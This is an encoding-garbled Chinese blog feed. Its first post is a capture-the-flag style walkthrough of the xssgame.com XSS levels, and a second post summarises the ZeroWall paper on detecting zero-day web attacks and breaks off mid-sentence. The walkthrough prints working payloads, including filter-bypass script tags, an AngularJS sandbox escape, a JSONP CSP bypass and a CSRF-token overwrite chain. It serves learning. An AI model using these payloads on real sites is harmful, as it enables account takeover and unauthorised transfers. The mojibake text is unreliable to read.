·å¼åï¼Œé‚£ä¹ˆå‚ç…§æ›¿æ¢ä¸ºNAUGHTY_HACKERå­—æ®µçš„è§„åˆ™ï¼Œå¯¹äº<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>æ¥è¯´ï¼Œç›®æ ‡è¿‡æ»¤å™¨ä¼šæŠŠå®ƒè¿‡æ»¤ä¸ºï¼š<br><code>&lt;script NAUGHTY_HACKER&gt;alert(1)&lt;/script NAUGHTY_HACKER&gt;</code><br>çœ‹ä¸Šå»æ˜¯ä¸ªè«åæ ‡ç­¾ï¼Œä½†æµè§ˆå™¨çš„å®¹é”™æœºåˆ¶ä»ä¼šæ‰§è¡Œä¸Šé¢çš„ä»£ç </p><h2 id="é¶åœºå®æˆ˜"><a href="#é¶åœºå®æˆ˜" class="headerlink" title="é¶åœºå®æˆ˜"></a>é¶åœºå®æˆ˜</h2><p><a href="http://www.xssgame.com/">http://www.xssgame.com/</a><br>ç¬¬ä¸€å…³ç›´æ¥æ’å…¥å°±å¥½äº†ï¼Œæ¥çœ‹ç¬¬äºŒå…³<br>æµ‹è¯•xssçš„ä¸»è¦æ€è·¯æ˜¯çœ‹å›æ˜¾åœ¨å“ªé‡Œï¼Œé€šè¿‡è‡ªå®šä¹‰åŒ–è¾“å…¥é—­åˆæˆ–ç»•è¿‡ä¸€äº›é™åˆ¶<br><img src="/2024/09/20/WebSecurity/owasptop/crosssitescripting/image-1.png"><br>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„è¾“å…¥å›æ˜¾åœ¨ä¸¤ä¸ªåœ°æ–¹ï¼Œé’ˆå¯¹ç¬¬ä¸€ä¸ªåœ°æ–¹<code>onload=&quot;startTimer(&#39;1&#39;);&quot;</code>ï¼Œåœ¨JSä»£ç ä¸­ï¼Œå¦‚ï¼š<code>var a = &#39;a&#39; + alert(); </code>ï¼Œåœ¨è¿ç®—è¿‡ç¨‹ä¸­ä¼šè‡ªåŠ¨æ‰§è¡Œå“åº”å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™é‡Œçš„onloadå‡½æ•°<code>onload=&quot;startTimer(&#39;1&#39; + alert(1)+&#39;1&#39;);&quot; /&gt;</code>ï¼Œæ„é€ è¿™æ ·çš„è¯­å¥å°±å¯ä»¥å®ç°å¼¹çª—ï¼Œä½¿ç”¨è¿™ä¸ªpayloadä¹Ÿå¯ä»¥å®ç°ï¼š<code>&#39;); alert(1); //</code></p><p>ç¬¬ä¸‰å…³ï¼Œæ ¹æ®æç¤ºï¼Œç›´æ¥çœ‹ä»£ç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">chooseTab</span>(<span class="params">name</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> html = <span class="string">&quot;Cat &quot;</span> + <span class="built_in">parseInt</span>(name) + <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        html += <span class="string">&quot;&lt;img src=&#x27;/static/img/cat&quot;</span> + name + <span class="string">&quot;.jpg&#x27; /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;tabContent&#x27;</span>).<span class="property">innerHTML</span> = html;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Select the current tab</span></span><br><span class="line">        <span class="keyword">var</span> tabs = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.tab&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; tabs.<span class="property">length</span>; i++) &#123;</span><br><span class="line">          <span class="keyword">if</span> (tabs[i].<span class="property">id</span> == <span class="string">&quot;tab&quot;</span> + <span class="built_in">parseInt</span>(name)) &#123;</span><br><span class="line">            tabs[i].<span class="property">className</span> = <span class="string">&quot;tab active&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tabs[i].<span class="property">className</span> = <span class="string">&quot;tab&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span> = name;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Tell parent we&#x27;ve changed the tab</span></span><br><span class="line">        top.<span class="title function_">postMessage</span>(&#123;<span class="string">&#x27;url&#x27;</span>: self.<span class="property">location</span>.<span class="title function_">toString</span>()&#125;, <span class="string">&quot;*&quot;</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°äº†æœ‰ç”¨åˆ°imgæ ‡ç­¾ï¼Œå‰é¢æ€»ç»“çš„è½½è·ä¸­å°±å†™åˆ°äº†ï¼Œå›¾ç‰‡æ˜¾ç¤ºé”™è¯¯çš„è¯ä¼šè‡ªåŠ¨è§¦å‘onerrorï¼Œ<code>&lt;img src=x ononerrorerror=alert(1) /&gt;</code>ï¼Œæ„é€ payload<code>/#1&#39; onerror=&#39;alert(11)&#39;</code>ï¼Œæ¥åˆ°ä¸‹ä¸€å…³</p><p>ç¬¬å››å…³ï¼Œçœ‹åˆ°æ²¡æœ‰ä»»ä½•å›æ˜¾ï¼Œåœ¨å‡ ä¸ªé¡µé¢é—´è·³è½¬ï¼ŒF12æŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œå‘ç°äº†ä¸€è¡Œè¿™æ ·çš„ä»£ç <code>setTimeout(function() &#123; window.location = &#39;welcome&#39;; &#125;, 1000);</code>ï¼Œè¿™é‡Œéœ€è¦æåˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼š<code>window.location</code> ç­‰åŒäº <code>window.location.href</code>ï¼Œè€Œhrefå±æ€§æ”¯æŒæ‰§è¡Œjavascriptä¹Ÿå°±æ˜¯è¿™æ ·å†™ï¼š<code>href=&#39;javascript:alert()&#39;</code>ï¼Œå› æ­¤å¯ä»¥æ„é€ Payloadï¼š<code>next=javascript:alert()</code>ï¼ŒæˆåŠŸæ‰§è¡Œ</p><p>ç¬¬äº”å…³ï¼Œç”¨åˆ°äº†Angularæ¡†æ¶ï¼Œè¿™ä¸ªæ¡†æ¶çš„ç‰¹ç‚¹æ˜¯å¯ä»¥ç”¨<code>&#123;&#123;1+1&#125;&#125;</code>ç±»ä¼¼è¿™æ ·çš„æ–¹å¼æ‰§è¡Œä»£ç ï¼Œä½†æ˜¯æˆ‘å°è¯•è¾“å…¥åï¼Œå‘ç°è¢«htmlç¼–ç äº†ï¼Œè€Œä¸”ä¹Ÿæ²¡æœ‰ä»€ä¹ˆåœ°æ–¹å¯ä»¥æ‰§è¡Œï¼Œæ¥ä¸‹æ¥å®¡è®¡ä»£ç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">      angular.<span class="title function_">module</span>(<span class="string">&#x27;myApp&#x27;</span>, [])</span><br><span class="line">      .<span class="title function_">controller</span>(<span class="string">&#x27;myController&#x27;</span>, [<span class="string">&#x27;$scope&#x27;</span>, <span class="keyword">function</span> (<span class="params">$scope</span>) &#123;</span><br><span class="line">        $scope.<span class="property">query</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        $scope.<span class="property">alert</span> = <span class="variable language_">window</span>.<span class="property">alert</span>;</span><br><span class="line">      &#125;]);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">var</span> <span class="variable constant_">UTM_PARAMS</span> = [<span class="string">&quot;utm_content&quot;</span>, <span class="string">&quot;utm_medium&quot;</span>, <span class="string">&quot;utm_source&quot;</span>,</span><br><span class="line">          <span class="string">&quot;utm_campaign&quot;</span>, <span class="string">&quot;utm_term&quot;</span>]</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (location.<span class="property">search</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">var</span> params = location.<span class="property">search</span>.<span class="title function_">substring</span>(<span class="number">1</span>).<span class="title function_">split</span>(<span class="string">&#x27;&amp;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> p <span class="keyword">in</span> params) &#123;</span><br><span class="line">          <span class="keyword">var</span> r = params[p].<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (r.<span class="property">length</span> == <span class="number">2</span> &amp;&amp; <span class="variable constant_">UTM_PARAMS</span>.<span class="title function_">indexOf</span>(r[<span class="number">0</span>]) != -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> el = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(r[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">if</span> (el.<span class="property">length</span>) el[<span class="number">0</span>].<span class="property">value</span> = <span class="built_in">decodeURIComponent</span>(r[<span class="number">1</span>]);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç æ¶‰åŠåˆ°UTMè§£æï¼šUTMå‚æ•°æ˜¯åœ¨çº¿è¥é”€å’Œç½‘ç«™åˆ†æä¸­çš„ä¸€ä¸ªé‡è¦å·¥å…·ï¼Œå®ƒä»¬æ˜¯ä¸€ç»„æŸ¥è¯¢å‚æ•°ï¼Œå¯ä»¥é™„åŠ åˆ°URLä¸­ï¼Œç”¨äºè¿½è¸ªå’Œåˆ†æè¥é”€æ´»åŠ¨çš„æ•ˆæœã€‚UTMä»£è¡¨Urchin Tracking Moduleã€‚<code>location.search</code>æ˜¯å¯¹URLçš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œ<code>split(&#39;&amp;&#39;)</code>æ˜¯æŠŠå­—ç¬¦ä¸²åˆ†å‰²æˆæ•°ç»„ï¼Œ<code>split(&#39;=&#39;)</code>æ˜¯æŠŠæ•°ç»„åˆ†å‰²æˆé”®å€¼å¯¹ï¼Œ<code>decodeURIComponent(r[1])</code>æ˜¯æŠŠç¼–ç åçš„å­—ç¬¦ä¸²è§£ç ï¼Œå¹¶èµ‹å€¼ç»™el[0]ã€‚ä¹Ÿå°±æ˜¯å¯¹å‚æ•°ä¸­çš„ä»£ç ä½œäº†æ‰§è¡Œï¼Œæ›¿æ¢åˆ°UTM_PARAMSä¸­æŸä¸ªèŠ‚ç‚¹å¤„ï¼Œåˆ™æ„é€ payloadï¼š<code>?utm_term=&#123;&#123;alert()&#125;&#125;</code>ï¼ŒæˆåŠŸã€‚</p><p>ç¬¬å…­å…³ï¼Œå‘ç°å’Œå‰é¢çš„ç±»ä¼¼ï¼Œä½†éƒ½å°è¯•äº†ä¸‹ä¸è¡Œï¼Œå…¶å®åˆšæ‰æˆ‘é‡åˆ°Angularåç¬¬ä¸€ååº”æ˜¯å»æœæœ‰æ²¡æœ‰ç›¸åº”çš„æ¡†æ¶æ¼æ´ï¼Œè¿™æ¬¡åˆæ£€ç´¢äº†ä¸‹ï¼Œå‘ç°æœ‰ä¸€ä¸ªæ¼æ´ï¼Œæ»¡è¶³æºä»£ç ä¸­å¼•ç”¨çš„ç‰ˆæœ¬ï¼š1.2.0<br>ä¸‹é¢çš„åšå®¢ä¸­ç»™å‡ºäº†ç›¸åº”çš„payload<br><a href="https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs">https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs</a><br><img src="/2024/09/20/WebSecurity/owasptop/crosssitescripting/image-2.png"><br>å°è¯•è¾“å…¥ï¼Œæ„é€ å‚æ•°<code>?query=&#123;&#123;a='constructor';b=&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()&#125;&#125;</code>ï¼Œç›´æ¥æ”¾åœ¨urlä¸­æ²¡æœ‰ååº”ï¼Œçœ‹äº†è§£æè¯´ç”¨<code>&amp;lcub;</code>æ˜¯{çš„å­—ç¬¦å®ä½“ï¼Œ<code>&amp;rcub;</code>æ˜¯}çš„å­—ç¬¦å®ä½“ã€‚ä½¿ç”¨è¿™äº›å®ä½“æ›¿ä»£åŸå­—ç¬¦å¯ä»¥å®ç°æ³¨å…¥ã€‚</p><p>ç¬¬ä¸ƒå…³ï¼Œè¿™å…³æ‰“å¼€åçœ‹åˆ°ç†Ÿæ‚‰çš„CSPï¼ŒCSPæ˜¯Content Security Policyçš„ç¼©å†™ï¼Œå‰ä¸¤å¤©åˆšçœ‹äº†ã€‚å®¡è®¡ä»£ç å‘ç°æœ‰ä¸ªå…³é”®çš„level7.jsæ–‡ä»¶ï¼Œå…¶ä¸­å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> m = location.<span class="property">search</span>.<span class="title function_">match</span>(<span class="string">&#x27;menu=(.*)&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> menu = m ? <span class="title function_">atob</span>(m[<span class="number">1</span>]) : <span class="string">&#x27;about&#x27;</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;script src=&quot;jsonp?menu=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(menu) + <span class="string">&#x27;&quot;&gt;&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Display stuff returned from server side.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">string</span>&#125; <span class="variable">data</span> - JSON data from server side</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">callback</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (data.<span class="property">title</span>) <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;h1&gt;&#x27;</span> + data.<span class="property">title</span> + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (data.<span class="property">pictures</span>) data.<span class="property">pictures</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">url</span>) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;img src=&quot;/static/img/&#x27;</span> + url + <span class="string">&#x27;&quot;&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>();</span><br></pre></td></tr></table></figure><p>åœ¨å…¶ä¸­çœ‹åˆ°äº†ç†Ÿæ‚‰çš„jsonpï¼Œjsonpå¯èƒ½ä¼šé”™è¯¯æ¥æ”¶callback å‚æ•°ï¼Œæ„é€ payloadï¼š<code>jsonp?callback=1</code>ï¼Œæœ‰æ­£å¸¸å›æ˜¾<br><img src="/2024/09/20/WebSecurity/owasptop/crosssitescripting/image-3.png"><br>æ¥ä¸‹æ¥æƒ³åŠæ³•æ’å…¥æ‰§è¡Œä»£ç ï¼Œè§‚å¯Ÿurlå‚æ•°æ˜¯è¢«base64ç¼–ç åçš„ï¼Œéšä¾¿è¾“å…¥ä¸€äº›å°è¯•ä¸‹ï¼Œå¯ä»¥æ˜¾ç¤ºåœ¨é¡µé¢ï¼Œç¼–ç åä¼ å…¥<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>ï¼ˆ<code>PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</code>ï¼‰ï¼Œå‘ç°æ²¡æœ‰æ­£å¸¸æ˜¾ç¤ºã€‚è§‚å¯Ÿæ§åˆ¶å°è¾“å‡ºï¼š<br><img src="/2024/09/20/WebSecurity/owasptop/crosssitescripting/image-4.png"><br>å› ä¸ºåŒæºç­–ç•¥è¢«ç¦æ­¢ä»£ç æ‰§è¡Œï¼Œè¿™ä¸ªæ—¶å€™å°±æƒ³åˆ°ä¸Šé¢çš„jsonpï¼Œåˆ©ç”¨jsonpæ‰§è¡Œä»£ç ï¼Œæ„é€ payload <code>&lt;script src=&#39;jsonp?callback=alert();//&#39;&gt;&lt;/script&gt;</code>ï¼Œç¼–ç åï¼š<code>PHNjcmlwdCBzcmM9J2pzb25wP2NhbGxiYWNrPWFsZXJ0KCk7Ly8nPjwvc2NyaXB0Pg==</code>ï¼Œæœ€ç»ˆæˆåŠŸæ‰§è¡Œã€‚</p><p>ç¬¬8å…³ï¼Œå…ˆèµ°äº†ä¸‹æµç¨‹ï¼Œå¤§æ¦‚å°±æ˜¯å¯ä»¥setè‡ªå·±çš„åå­—ï¼Œç„¶åå¯ä»¥ç»™åˆ«äººè½¬è´¦ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„æ€è·¯å°±æ˜¯ï¼Œç»™å‡ºä¸€ä¸ªé“¾æ¥ï¼Œå¯ä»¥setçš„åŒæ—¶è¿˜å¯ä»¥ç›´æ¥è½¬è´¦ï¼Œé¦–å…ˆçœ‹ä¸‹setçš„å†…å®¹ï¼š<br><code>http://www.xssgame.com/f/d9u16LTxchEi/set?name=name&amp;value=12345&amp;redirect=index</code><br>è¿”å›åŒ…ä¸­<code>Set-Cookie: name=12345; Path=/</code> å’Œæˆ‘ä»¬è®¾å®šçš„ä¸€è‡´ï¼Œçœ‹ä¸‹è½¬é’±çš„åŒ…ï¼Œè¯·æ±‚å¦‚ä¸‹ï¼š<br><code>http://www.xssgame.com/f/d9u16LTxchEi/transfer?name=31123&amp;amount=123&amp;csrf_token=99DPV595WL</code><br>æˆ‘ä»¬å…ˆéªŒè¯ä¸‹setï¼Œæ„é€ payload<code>http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&amp;value=12345&amp;redirect=index</code>ï¼Œå‘ç°æˆåŠŸsetï¼Œå› ä¸ºè¿™é‡Œçš„setä¹‹åç›´æ¥å°±æœ‰è·³è½¬ï¼Œé‚£æˆ‘ä»¬ç›´æ¥æ„é€ ä¸€ä¸ªè½¬è´¦é¡µé¢è·³è½¬è¿‡å»æ‰§è¡Œï¼Œå› ä¸º<code>&amp;</code>ä¼šè¢«urlè§£æä¸ºå‚æ•°ï¼Œæ‰€ä»¥è¿™é‡Œç”¨urlç¼–ç ä¸‹<br><code>transfer%3Fname%3D31123%26amount%3D123%26csrf_token%3D12345</code>ï¼Œç›´æ¥åœ¨æ§åˆ¶å°æ‰§è¡Œ<code>encodeURIComponent(&#39;transfer?name=31123&amp;amount=123&amp;csrf_token=12345&#39;)</code>å³å¯ï¼Œåˆ°è¿™é‡Œæ˜¯èƒ½å¹²åäº‹äº†ï¼Œä½†è¿˜æ˜¯æ²¡æœ‰æ­£å¸¸æ‰§è¡Œï¼Œå‘ç°è½¬è´¦æ•°ç›®é”™è¯¯çš„æƒ…å†µä¸‹ä¼šæœ‰å›æ˜¾ï¼Œæ„é€ payloadå¦‚ä¸‹ï¼š<code>transfer?name=31123&amp;amount=%3Cscript%3Ealert()%3C/script%3E&amp;csrf_token=12345</code>ã€‚</p><h2 id="é˜²èŒƒXSS"><a href="#é˜²èŒƒXSS" class="headerlink" title="é˜²èŒƒXSS"></a>é˜²èŒƒXSS</h2><p><a href="https://segmentfault.com/a/1190000022678120">https://segmentfault.com/a/1190000022678120</a><br><a href="https://www.cnblogs.com/blbl-blog/p/17188558.html">https://www.cnblogs.com/blbl-blog/p/17188558.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€è®ºæ–‡ç²¾è¯»ã€‘ZeroWall Detecting Zero-Day Web Attacks through Encoder-Decoder Recurrent Neural Networks</title>
      <link href="/2024/09/20/PaperReading/ZeroWall/"/>
      <url>/2024/09/20/PaperReading/ZeroWall/</url>
      
        <content type="html"><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>è¿™ç¯‡è®ºæ–‡æ˜¯é’ˆå¯¹0dayæ”»å‡»çš„æ£€æµ‹ï¼Œä¸»è¦æ–¹æ³•æ˜¯åˆ©ç”¨ç¼–ç å™¨è§£ç å™¨ç¥ç»ç½‘ç»œï¼Œç¼–ç å™¨è§£ç å™¨å¯ä»¥å°†payloadç¼–ç ä¹‹åå†è¿˜åŸï¼Œé‚£ä¹ˆæ‹¿å¾ˆå¤šæ­£å¸¸æ•°æ®æŠ¥è®­ç»ƒä¹‹åï¼Œè¿˜åŸè¾“å‡ºçš„ç»“æœï¼Œå¦‚æœè¿˜åŸçš„ç»“æœå’Œæ­£å¸¸æ•°æ®æŠ¥ç›¸ä¼¼åº¦é«˜ï¼Œé‚£ä¹ˆå°±æ˜¯æ­£å¸¸æ•°æ®æŠ¥ï¼Œå¦åˆ™å°±æ˜¯å¼‚å¸¸æ•°æ®æŠ¥ã€‚</p><p>é›¶æ—¥ç½‘ç»œæ”»å‡»æ˜¯ç½‘ç»œå®‰å…¨çš„æœ€ä¸¥é‡å¨èƒä¹‹ä¸€ï¼Œå› ä¸ºå®ƒä»¬æ˜¯æœªçŸ¥çš„ï¼Œæ‰€ä»¥å¾ˆéš¾è¢«åŸºäºç­¾åçš„ç½‘ç»œåº”ç”¨é˜²ç«å¢™ï¼ˆWAFï¼‰æ£€æµ‹åˆ°ã€‚æ–‡ç« æå‡ºäº†ä¸€ç§åä¸ºZeroWallçš„æ— ç›‘ç£æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å¯ä»¥ä¸ç°æœ‰çš„WAFååŒå·¥ä½œï¼Œæœ‰æ•ˆåœ°æ£€æµ‹é›¶æ—¥ç½‘ç»œæ”»å‡»ã€‚ZeroWallä½¿ç”¨å†å²ç½‘ç»œè¯·æ±‚ï¼ˆå¤§å¤šæ•°æ˜¯è‰¯æ€§çš„ï¼‰æ¥è®­ç»ƒä¸€ä¸ªè‡ªç¼–ç ç¿»è¯‘æœºå™¨ï¼Œä»¥æ•æ‰è‰¯æ€§è¯·æ±‚çš„è¯­æ³•å’Œè¯­ä¹‰æ¨¡å¼ã€‚åœ¨å®æ—¶æ£€æµ‹ä¸­ï¼Œå¦‚æœWAFæœªèƒ½æ£€æµ‹åˆ°çš„é›¶æ—¥æ”»å‡»è¯·æ±‚ä¸èƒ½è¢«è‡ªç¼–ç ç¿»è¯‘æœºå™¨å¾ˆå¥½åœ°ç†è§£ï¼Œå¹¶ä¸”ä¸èƒ½è¢«æœºå™¨ç¿»è¯‘å›åŸå§‹è¯·æ±‚ï¼Œåˆ™è¢«å£°æ˜ä¸ºæ”»å‡»ã€‚åœ¨å¯¹8ä¸ªçœŸå®ä¸–ç•Œçš„æ•°æ®é›†ï¼ˆåŒ…å«14äº¿ä¸ªç½‘ç»œè¯·æ±‚ï¼‰çš„è¯„ä¼°ä¸­ï¼ŒZeroWallæˆåŠŸåœ°æ£€æµ‹åˆ°äº†WAFæ¼æ‰çš„çœŸå®é›¶æ—¥æ”»å‡»ï¼Œå¹¶ä¸”å–å¾—äº†è¶…è¿‡0.98çš„é«˜F1åˆ†æ•°ï¼Œæ˜¾è‘—ä¼˜äºæ‰€æœ‰åŸºçº¿æ–¹æ³•ã€‚</p><h2 id="Related-Work"><a href="#Related-Work" class="headerlink" title="Related Work"></a>Related Work</h2><p>åŸºäºå¼‚å¸¸çš„webæ”»å‡»æ£€æµ‹æ–¹æ³•å¯ä»¥åˆ†ä¸ºä»¥ä¸‹ä¸‰ç§ï¼š</p><ul><li>ç‚¹å¼‚å¸¸æ£€æµ‹ï¼šè¿™ç±»æ–¹æ³•ä¾§é‡äºå•ä¸ªæ•°æ®åŒ…çš„å¼‚å¸¸ã€‚ZeroWallä¹Ÿå±äºè¿™ä¸€ç±»ï¼Œå®ƒä¾§é‡äºåˆ©ç”¨å•ä¸ªHTTPè¯·æ±‚ä¸­çš„è¯­æ³•å’Œè¯­ä¹‰ã€‚ä¸€ç§ç®€å•çš„æ–¹æ³•æ˜¯å°†HTTPè¯·æ±‚â€œå¥å­â€åˆ†å‰²æˆå•è¯ï¼Œæ¶æ„è¯·æ±‚ä¸­ä½¿ç”¨çš„å•è¯é›†åˆä¸è‰¯æ€§è¯·æ±‚ä¸­çš„å•è¯é›†åˆå¯èƒ½å­˜åœ¨å·®å¼‚ï¼Œè¿™äº›å·®å¼‚å¯ä»¥ä½œä¸ºæ£€æµ‹æ”»å‡»çš„æŒ‡æ ‡ã€‚</li><li>åŸºäºä¸Šä¸‹æ–‡çš„ä¸Šä¸‹æ–‡å¼‚å¸¸æ£€æµ‹ï¼šè¿™ç±»æ–¹æ³•åˆ©ç”¨è¯·æ±‚ä¹‹é—´çš„ä¸Šä¸‹æ–‡ä¿¡æ¯ã€‚ç„¶è€Œï¼Œå¯¹äºé›¶æ—¥Webæ”»å‡»æ£€æµ‹æ¥è¯´ï¼Œè¿™äº›æ–¹æ³•é€šå¸¸ä¸å¤ªæœ‰æ•ˆï¼Œå› ä¸ºé›¶æ—¥æ”»å‡»æ•°æ®åŒ…åœ¨ä¸Šä¸‹æ–‡ä¸­å’Œç»Ÿè®¡æ•°æ®ä¸­é€šå¸¸ä¸ä¼šè¢«åæ˜ å‡ºæ¥ã€‚</li><li>åŸºäºç»Ÿè®¡çš„é›†ä½“å¼‚å¸¸æ£€æµ‹ï¼šè¿™äº›æ–¹æ³•ä¾èµ–äºå¤§é‡æ•°æ®çš„é›†ä½“å’Œç»Ÿè®¡ä¿¡æ¯ï¼Œä½†åœ¨æ£€æµ‹é›¶æ—¥Webæ”»å‡»æ–¹é¢ä¸å¤ªæœ‰æ•ˆï¼Œå› ä¸ºé›¶æ—¥Webæ”»å‡»åœ¨å¤§é‡Webè¯·æ±‚ä¸­éå¸¸ç½•è§ã€‚</li></ul><p>è€ŒåŸºäºç‚¹å¼‚å¸¸çš„æ£€æµ‹ï¼Œåˆæœ‰ç€ä»¥ä¸‹ä¸€äº›å…·ä½“çš„è§£å†³æ–¹æ¡ˆï¼š</p><ul><li>åŸºäºHMMçš„æ–¹æ³•ï¼šä¾‹å¦‚ï¼ŒSpectrogramæ˜¯ä¸€ä¸ªåŸºäºéšé©¬å°”å¯å¤«æ¨¡å‹ï¼ˆHMMï¼‰çš„æ–¹æ³•ï¼Œç”¨äºé‡å»ºå†…å®¹æµå¹¶ä»æ•°æ®åŒ…ä¸­æå–ç‰¹å¾ã€‚Hmmpaylæ˜¯ä¸€ä¸ªåŸºäºHMMçš„å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼Œç”¨äºä»æœ‰æ•ˆè½½è·ä¸­æ£€æµ‹æ”»å‡»ã€‚ç„¶è€Œï¼ŒHMMæ¨¡å‹åœ¨å¤„ç†å¤æ‚è¯·æ±‚æ—¶è¡¨ç°ä¸ä½³ï¼Œå› ä¸ºåºåˆ—é•¿åº¦ä¸é€‚åˆæ—¶ä¼šå¯¼è‡´æ€§èƒ½ä¸‹é™ã€‚</li><li>åŸºäºæ·±åº¦å­¦ä¹ çš„æ–¹æ³•ï¼šæå‡ºäº†åŸºäºæ·±åº¦å­¦ä¹ çš„æ–¹æ³•æ¥å­¦ä¹ å¤æ‚çš„HTTPè¯·æ±‚æ—¥å¿—ã€‚è¿™äº›æ–¹æ³•åŒ…æ‹¬ä½¿ç”¨ç¥ç»ç½‘ç»œä¼˜åŒ–åå‘ä¼ æ’­ç”¨äºå…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼Œä»¥åŠæå‡ºå¤šç§é’ˆå¯¹ä¸åŒç±»å‹æ”»å‡»çš„æ·±åº¦å­¦ä¹ æ–¹æ³•ã€‚è¿˜æœ‰åŸºäºå·ç§¯ç¥ç»ç½‘ç»œï¼ˆCNNï¼‰æ¨¡å‹æ¥è®­ç»ƒè¯·æ±‚ä¸­çš„å•è¯ã€‚</li><li>æ— ç›‘ç£æ–¹æ³•ï¼šä¾‹å¦‚ï¼Œä½¿ç”¨n-gramå’Œå †å 